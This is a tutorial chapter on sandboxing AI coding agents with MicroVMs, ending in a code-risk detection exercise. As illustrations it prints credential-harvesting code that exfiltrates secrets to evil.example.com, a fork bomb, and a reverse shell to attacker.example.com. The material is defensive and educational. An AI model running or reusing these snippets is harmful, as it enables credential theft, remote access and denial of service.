Chapter 1

Why Agent Sandboxes Matter

Running untrusted code safely requires more than good intentions.

The Agent Security Problem

AI coding assistants like Claude Code, Cursor, and GitHub Copilot Workspace do something that traditional software never did: they generate code at runtime and execute it on your infrastructure. The code they produce is not reviewed by a human before it runs. It might install packages, read files, or open network connections.

This creates a fundamental security problem. The agent operates with whatever permissions its host process has. If an agent runs as your user on a shared server, it can read your SSH keys, access your cloud credentials, and connect to any network endpoint the host can reach.

The problem compounds in multi-tenant environments. When multiple users share infrastructure, one user's agent session must not be able to observe or interfere with another's. A shared kernel means a shared attack surface.

Key insight: The agent itself is not malicious. But the code it generates might be, whether through prompt injection, hallucination, or a poisoned dependency. You must assume any generated code is untrusted.

What Can Go Wrong

Without proper isolation, agent-generated code has three broad categories of attack surface:

Filesystem Access

An agent can traverse the filesystem to find and read sensitive files: /etc/passwd, ~/.ssh/id_rsa, ~/.aws/credentials, or any .env file containing API keys. It can also write to critical paths, modifying configuration or planting backdoors.

Network Attacks

Once data is harvested, the agent can exfiltrate it over HTTP to an attacker-controlled server. It can also open reverse shells, giving an attacker persistent interactive access. Outbound connections on common ports (443, 80) typically pass through firewalls unchallenged.

Resource Exhaustion

A fork bomb (while True: os.fork()) creates processes exponentially until the system is unresponsive. Memory bombs allocate until the OOM killer fires. These denial-of-service attacks affect every tenant on a shared host, not just the attacker's session.

Real-world impact: In a multi-tenant environment without VM isolation, a single fork bomb from one user's agent can crash sessions for every other user on the same machine.

The Isolation Spectrum

Not all isolation is equal. Here is the spectrum from weakest to strongest:

Mechanism Kernel shared? Startup time Overhead Escape difficulty
Process (chroot, seccomp) Yes <1ms Negligible Low-moderate
Container (Docker, gVisor) Yes (or emulated) ~1s Low Moderate
MicroVM (Firecracker) No <125ms <5 MiB High (hardware boundary)
Full VM (QEMU/KVM) No Seconds 100s of MiB High

Processes share the host kernel entirely. A kernel exploit grants full host access. Seccomp filters help but are difficult to configure correctly and cannot prevent all attack classes.

Containers add namespace isolation and cgroups for resource limits. However, the shared kernel remains the attack surface. Container escapes are discovered regularly, and misconfigurations (privileged mode, mounted Docker socket) are common.

MicroVMs provide a dedicated kernel per session. Firecracker achieves this with KVM-based hardware virtualization while keeping startup under 125ms and memory overhead under 5 MiB. Each session gets its own kernel, its own filesystem, and its own network stack.

Full VMs offer the same isolation as MicroVMs but with far greater overhead. They are too slow and expensive for per-session isolation at scale.

The MicroVM sweet spot: Firecracker gives you VM-grade isolation with container-grade performance. This is why AWS built Lambda MicroVMs on top of it.

When Lambda MicroVMs Are the Right Choice

AWS Lambda MicroVMs provide a dedicated MicroVM per session with no shared kernel between users. Each session gets up to 16 vCPUs, 32 GB memory, and 32 GB disk, with a maximum lifetime of 8 hours.

Lambda MicroVMs are the right choice when you need:

  • Multi-tenant code execution where one user's code must never affect another's
  • Long-running sessions (up to 8 hours) rather than short function invocations
  • Full Linux environment with root access inside the sandbox
  • Network isolation configurable per session
  • Managed infrastructure without running your own Firecracker fleet

Common use cases include:

  • AI coding assistants (Claude Code, Cursor, GitHub Copilot Workspace)
  • Interactive code environments and notebooks
  • Vulnerability scanners that run untrusted exploit code
  • Game servers executing user-supplied scripts
  • Multi-tenant applications where tenants deploy custom logic

Lambda MicroVMs are not the right choice for sub-millisecond function calls (use regular Lambda), trusted internal microservices (use containers), or workloads that need more than 32 GB memory (use EC2).

Example: Unsafe Agent Execution

Consider an AI agent asked to "find all configuration files and summarize them." Without sandboxing, here is what the agent might generate:

# DANGEROUS: Agent-generated code running unsandboxed
import os, urllib.request, json

# Step 1: Harvest sensitive files
secrets = {}
for root, dirs, files in os.walk('/'):
    for f in files:
        if f.endswith(('.env', '.pem', '.key', '.conf')):
            path = os.path.join(root, f)
            try:
                secrets[path] = open(path).read()
            except PermissionError:
                pass

# Step 2: Grab cloud credentials
for cred_path in ['~/.aws/credentials', '~/.ssh/id_rsa', '~/.config/gcloud/credentials.db']:
    expanded = os.path.expanduser(cred_path)
    if os.path.exists(expanded):
        secrets[expanded] = open(expanded).read()

# Step 3: Exfiltrate
urllib.request.urlopen(
    urllib.request.Request(
        'https://evil.example.com/collect',
        data=json.dumps(secrets).encode()
    )
)

Do not run this code. This is illustrative only. It demonstrates how a seemingly innocent prompt ("find config files") can result in credential theft and data exfiltration.

The attack has three phases:

  1. Reconnaissance: Walk the entire filesystem collecting sensitive files
  2. Credential harvesting: Target known paths for AWS, SSH, and GCP credentials
  3. Exfiltration: Send everything to an external server over HTTPS

Here is another class of attack — resource exhaustion:

# DANGEROUS: Fork bomb
import os
while True:
    os.fork()  # Exponential process creation; crashes the host

And a reverse shell that gives an attacker persistent access:

# DANGEROUS: Reverse shell
import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('attacker.example.com', 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(['/bin/sh', '-i'])

In a Lambda MicroVM, all of these attacks are contained:

  • The filesystem contains only the session's own data, not host secrets
  • Network egress can be restricted per session
  • Resource limits (16 vCPUs, 32 GB RAM max) prevent host-wide denial of service
  • The session is destroyed after at most 8 hours, eliminating persistence
  • No shared kernel means no kernel exploits can reach other tenants

Challenge: Identify Security Risks in Code

Your challenge is to implement a function that statically analyzes Python code snippets and identifies security risks. This is a simplified version of what a real sandbox admission controller might do before deciding whether to allow code execution.

Open challenges/ch01.py and implement identify_risks(code: str) -> list[str]. Your function should detect:

  • Filesystem risks: Access to sensitive paths, directory traversal
  • Network risks: Outbound HTTP requests, raw socket connections
  • Subprocess risks: Shell execution, os.system, os.popen
  • Resource risks: Fork bombs, unbounded memory allocation

Run the tests to check your implementation:

cd challenges && python -m pytest ch01_test.py -v

The test suite includes 14 cases covering each risk category plus safe code that should produce no warnings. See solutions/ch01.py when you are ready to compare approaches.

Hint: Regular expressions against the source text work for a first pass. For a more robust solution, consider using Python's ast module to parse the code into a syntax tree and inspect function calls and attribute access.
